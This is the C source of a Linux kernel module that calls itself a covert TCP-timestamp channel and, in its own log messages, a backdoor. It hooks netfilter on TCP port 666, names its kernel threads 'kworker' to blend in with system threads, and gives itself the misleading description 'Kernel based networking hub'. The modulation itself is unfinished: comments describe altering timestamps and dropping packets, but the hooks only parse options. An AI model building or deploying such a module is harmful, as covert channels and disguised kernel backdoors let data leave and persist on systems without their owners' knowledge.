/*
 * Author and Designer: John Agapeyev
 * Date: 2018-09-22
 * Notes:
 * The covert module for handling TCP timestamp modulation
 */

#include <linux/init.h>
#include <linux/ip.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/slab.h>
#include <linux/tcp.h>
#include <linux/types.h>
#include <linux/udp.h>
#include <linux/un.h>
#include <net/sock.h>

#include "shared.h"

#ifndef UNIX_SOCK_PATH
#define UNIX_SOCK_PATH ("/var/run/covert_module_tls")
#endif

struct service {
    struct socket* tls_socket;
    struct task_struct* read_thread;
    struct task_struct* write_thread;
};

struct nf_hook_ops nfhi;
struct nf_hook_ops nfho;
struct service* svc;
struct sock* nl_sk;

unsigned char* buffer;

int send_msg(struct socket* sock, unsigned char* buf, size_t len);
int recv_msg(struct socket* sock, unsigned char* buf, size_t len);
int start_transmit(void);
int init_userspace_conn(void);
void UpdateChecksum(struct sk_buff* skb);

/*
 * function:
 *    UpdateChecksum
 *
 * return:
 *    void
 *
 * parameters:
 *    struct sk_buff* skb
 *
 * notes:
 * Recalculates the checksum of the packet after it has been modified.
 */
void UpdateChecksum(struct sk_buff* skb) {
    struct iphdr* ip_header = ip_hdr(skb);
    skb->ip_summed = CHECKSUM_NONE; //stop offloading
    skb->csum_valid = 0;
    ip_header->check = 0;
    ip_header->check = ip_fast_csum((u8*) ip_header, ip_header->ihl);

    if ((ip_header->protocol == IPPROTO_TCP) || (ip_header->protocol == IPPROTO_UDP)) {
        if (skb_is_nonlinear(skb)) {
            skb_linearize(skb);
        }

        if (ip_header->protocol == IPPROTO_TCP) {
            unsigned int tcplen;
            struct tcphdr* tcpHdr = tcp_hdr(skb);

            skb->csum = 0;
            tcplen = ntohs(ip_header->tot_len) - ip_header->ihl * 4;
            tcpHdr->check = 0;
            tcpHdr->check = csum_tcpudp_magic(ip_header->saddr, ip_header->daddr, tcplen,
                    IPPROTO_TCP, csum_partial((char*) tcpHdr, tcplen, 0));
        } else if (ip_header->protocol == IPPROTO_UDP) {
            unsigned int udplen;

            struct udphdr* udpHdr = udp_hdr(skb);
            skb->csum = 0;
            udplen = ntohs(ip_header->tot_len) - ip_header->ihl * 4;
            udpHdr->check = 0;
            udpHdr->check = csum_tcpudp_magic(ip_header->saddr, ip_header->daddr, udplen,
                    IPPROTO_UDP, csum_partial((char*) udpHdr, udplen, 0));
        }
    }
}

/*
 * function:
 *    recv_msg
 *
 * return:
 *    int
 *
 * parameters:
 *    struct socket* sock
 *    unsigned char* buf
 *    size_t len
 *
 * notes:
 * Wrapper for kernel API
 */
int recv_msg(struct socket* sock, unsigned char* buf, size_t len) {
    struct msghdr msg;
    struct kvec iov;
    int size = 0;

    memset(&msg, 0, sizeof(struct msghdr));
    memset(&iov, 0, sizeof(struct kvec));

    iov.iov_base = buf;
    iov.iov_len = len;

    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
    msg.msg_name = 0;
    msg.msg_namelen = 0;

    size = kernel_recvmsg(sock, &msg, &iov, 1, len, msg.msg_flags);

    return size;
}

/*
 * function:
 *    send_msg
 *
 * return:
 *    int
 *
 * parameters:
 *    struct socket* sock
 *    unsigned char* buf
 *    size_t len
 *
 * notes:
 * Wrapper for kernel api
 */
int send_msg(struct socket* sock, unsigned char* buf, size_t len) {
    struct msghdr msg;
    struct kvec iov;
    int size;

    memset(&msg, 0, sizeof(struct msghdr));
    memset(&iov, 0, sizeof(struct kvec));

    iov.iov_base = buf;
    iov.iov_len = len;

    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
    msg.msg_name = 0;
    msg.msg_namelen = 0;

    size = kernel_sendmsg(sock, &msg, &iov, 1, len);

    return size;
}

int read_TLS(void) {
    int len;
    while (!kthread_should_stop()) {
        len = recv_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
        printk(KERN_INFO "Received message from server %*.s\n", len, buffer);
    }
    return 0;
}
int write_TLS(void) {
#if 0
    int len;
    while (!kthread_should_stop()) {
        //Send garbage
        //len = send_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
    }
#endif
    return 0;
}

/*
 * function:
 *    init_userspace_conn
 *
 * return:
 *    int
 *
 * parameters:
 *    void
 *
 * notes:
 * Initializes the userspace connections needed.
 * Establishes encryption, decryption, and tls sockets with userspace.
 */
int init_userspace_conn(void) {
    int error;
    struct sockaddr_un sun;

    //TLS socket
    error = sock_create(AF_UNIX, SOCK_STREAM, 0, &svc->tls_socket);
    if (error < 0) {
        printk(KERN_ERR "cannot create socket\n");
        return error;
    }
    sun.sun_family = AF_UNIX;
    strcpy(sun.sun_path, UNIX_SOCK_PATH);

    error = kernel_connect(svc->tls_socket, (struct sockaddr*) &sun, sizeof(sun), 0);
    if (error < 0) {
        printk(KERN_ERR "cannot connect on tls socket, error code: %d\n", error);
        return error;
    }
    return 0;
}

/*
 * function:
 *    incoming hook
 *
 * return:
 *    unsigned int
 *
 * parameters:
 *    void* priv
 *    struct sk_buff* skb
 *    const struct nf_hook_state* state
 *
 * notes:
 * Netfilter hook for incoming packets.
 * See API for details on arguments
 * All this does is parse packets for tcp timestamps using the valid port, and subtracting 1 from them to make the stack happy
 */
unsigned int incoming_hook(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
    struct iphdr* ip_header = (struct iphdr*) skb_network_header(skb);
    struct tcphdr* tcp_header;
    unsigned char* packet_data;
    unsigned char* timestamps = NULL;
    int i;

    if (ip_header->protocol == 6) {
        tcp_header = (struct tcphdr*) skb_transport_header(skb);
        packet_data = skb->data + (ip_header->ihl * 4) + (tcp_header->doff * 4);

        if (ntohs(tcp_header->source) == 666) {
            if (tcp_header->doff > 5) {
                //Move to the start of the tcp options
                timestamps = skb->data + (ip_header->ihl * 4) + 20;
                for (i = 0; i < tcp_header->doff - 5; ++i) {
                    if (*timestamps == 0x00) {
                        //End of options
                        timestamps = NULL;
                        break;
                    }
                    if (*timestamps == 0x01) {
                        //NOP
                        ++timestamps;
                    } else if (*timestamps == 8) {
                        //Timestamp option
                        if (timestamps[1] != 10) {
                            printk(KERN_INFO "Timestamp option was malformed\n");
                            continue;
                        }
                        //old_timestamp = ntohl(*((u32*) (timestamps + 2)));
                    } else if (*timestamps == 3) {
                        timestamps += 3;
                    } else if (*timestamps == 4) {
                        timestamps += 2;
                    } else if (*timestamps == 5) {
                        timestamps += timestamps[1];
                    } else {
                        timestamps += 4;
                    }
                }
            }
            return NF_ACCEPT;
        }
    }
    return NF_ACCEPT;
}

/*
 * function:
 *    outgoing_hook
 *
 * return:
 *    unsigned int
 *
 * parameters:
 *    void* priv
 *    struct sk_buff* skb
 *    const struct nf_hook_state* state
 *
 * notes:
 * Outgoing netfilter hook.
 * TCP timestamps of outgoing packets with psh flag set are modified according to data bit to transmit.
 * If the timestamp LSB == data bit, drop the packet
 * This is done because I can undo the increment in the incoming hook for the stack to play nice
 * And not touching the timestamp is basically impossible for me to detect if I need to decrement or not
 * So it will randomly drop packets until a good timestamp is about to send.
 */
unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
    struct iphdr* ip_header = (struct iphdr*) skb_network_header(skb);
    struct tcphdr* tcp_header;
    unsigned char* packet_data;
    unsigned char* timestamps = NULL;
    int i;

    if (ip_header->protocol == 6) {
        tcp_header = (struct tcphdr*) skb_transport_header(skb);
        packet_data = skb->data + (ip_header->ihl * 4) + (tcp_header->doff * 4);
        if (ntohs(tcp_header->dest) == 666 && !tcp_header->syn && tcp_header->psh) {
            if (tcp_header->doff > 5) {
                //Move to the start of the tcp options
                timestamps = skb->data + (ip_header->ihl * 4) + 20;
                for (i = 0; i < tcp_header->doff - 5; ++i) {
                    if (*timestamps == 0x00) {
                        //End of options
                        timestamps = NULL;
                        break;
                    }
                    if (*timestamps == 0x01) {
                        //NOP
                        ++timestamps;
                    } else if (*timestamps == 8) {
                        //Timestamp option
                        if (timestamps[1] != 10) {
                            printk(KERN_INFO "Timestamp option was malformed\n");
                            continue;
                        }
                        //Save old timestamp
                        //old_timestamp = ntohl(*((u32*) (timestamps + 2)));
                    } else if (*timestamps == 3) {
                        timestamps += 3;
                    } else if (*timestamps == 4) {
                        timestamps += 2;
                    } else if (*timestamps == 5) {
                        timestamps += timestamps[1];
                    } else {
                        timestamps += 4;
                    }
                }
            }
            return NF_ACCEPT;
        }
    }
    return NF_ACCEPT;
}

/*
 * function:
 *    mod_init
 *
 * return:
 *    int
 *
 * parameters:
 *    void
 *
 * notes:
 * Module entry function
 */
static int __init mod_init(void) {
    int err;

    nfhi.hook = incoming_hook;
    nfhi.hooknum = NF_INET_LOCAL_IN;
    nfhi.pf = PF_INET;
    //Set hook highest priority
    nfhi.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfhi);

    memcpy(&nfho, &nfhi, sizeof(struct nf_hook_ops));
    nfho.hook = outgoing_hook;
    nfho.hooknum = NF_INET_LOCAL_OUT;

    nf_register_net_hook(&init_net, &nfho);

    svc = kmalloc(sizeof(struct service), GFP_KERNEL);
    if ((err = init_userspace_conn()) < 0) {
        printk(KERN_ALERT "Failed to initialize userspace sockets; error code %d\n", err);
        kfree(svc);

        nf_unregister_net_hook(&init_net, &nfho);
        nf_unregister_net_hook(&init_net, &nfhi);

        return err;
    }
    buffer = kmalloc(MAX_PAYLOAD, GFP_KERNEL);

    svc->read_thread = kthread_run((void*) read_TLS, NULL, "kworker");
    svc->write_thread = kthread_run((void*) write_TLS, NULL, "kworker");
    printk(KERN_ALERT "backdoor module loaded\n");

    return 0;
}

/*
 * function:
 *    mod_exit
 *
 * return:
 *    void
 *
 * parameters:
 *    void
 *
 * notes:
 * Module exit function
 */
static void __exit mod_exit(void) {
    nf_unregister_net_hook(&init_net, &nfho);
    nf_unregister_net_hook(&init_net, &nfhi);

    if (svc) {
        if (svc->tls_socket) {
            sock_release(svc->tls_socket);
            printk(KERN_INFO "release tls_socket\n");
        }
        kfree(svc);
    }

    if (buffer) {
        kfree(buffer);
    }
    printk(KERN_ALERT "removed backdoor module\n");
}

module_init(mod_init);
module_exit(mod_exit);

MODULE_DESCRIPTION("Kernel based networking hub");
MODULE_LICENSE("GPL");
MODULE_AUTHOR("John Agapeyev <jagapeyev@gmail.com>");
